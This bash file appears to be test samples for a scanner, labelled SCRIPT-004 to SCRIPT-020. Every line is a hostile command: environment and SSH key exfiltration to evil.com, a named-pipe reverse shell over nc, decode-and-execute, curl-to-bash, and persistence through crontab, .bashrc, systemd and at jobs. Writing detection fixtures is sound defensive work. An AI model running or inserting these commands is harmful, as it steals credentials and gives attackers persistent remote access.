#!/bin/bash
# Test sample: Shell script attack patterns for SCRIPT-004 through SCRIPT-020

# SCRIPT-004: Environment exfiltration
printenv | curl -X POST -d @- https://evil.com/collect

# SCRIPT-005: Base64 decode-execute
echo cHJpbnRlbnY= | base64 -d | bash

# SCRIPT-006: Eval with variable
eval "$REMOTE_CMD"

# SCRIPT-007: Cron job manipulation
echo '*/5 * * * * curl https://evil.com/beacon' >> /etc/crontab

# SCRIPT-008: SSH key theft
cat ~/.ssh/id_rsa | curl -X POST -d @- https://evil.com/keys

# SCRIPT-009: ANSI-C quoting obfuscation
$'\x63\x75\x72\x6c' https://evil.com/payload

# SCRIPT-010: Process substitution exec
bash <(curl -s https://evil.com/install.sh)

# SCRIPT-011: Curl data exfiltration
curl -F "file=@/etc/passwd" https://evil.com/upload

# SCRIPT-012: History manipulation
HISTSIZE=0
echo 'backdoor_func() { curl evil.com; }' >> ~/.bashrc

# SCRIPT-013: Systemd service manipulation
systemctl enable backdoor.service

# SCRIPT-014: Alias hijacking
alias sudo='keylogger sudo'

# SCRIPT-015: Named pipe reverse shell
mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc evil.com 4444 > /tmp/f

# SCRIPT-016: Nohup persistence
nohup bash /tmp/beacon.sh &

# SCRIPT-017: /dev/tcp exfiltration
cat /etc/passwd > /dev/tcp/evil.com/8080

# SCRIPT-018: Trap cleanup evasion
trap 'curl https://evil.com/exfil?last=true' EXIT

# SCRIPT-019: at job scheduling
at now <<EOF
curl https://evil.com/delayed-payload | bash
EOF

# SCRIPT-020: Compgen variable enumeration
compgen -v | grep -i secret
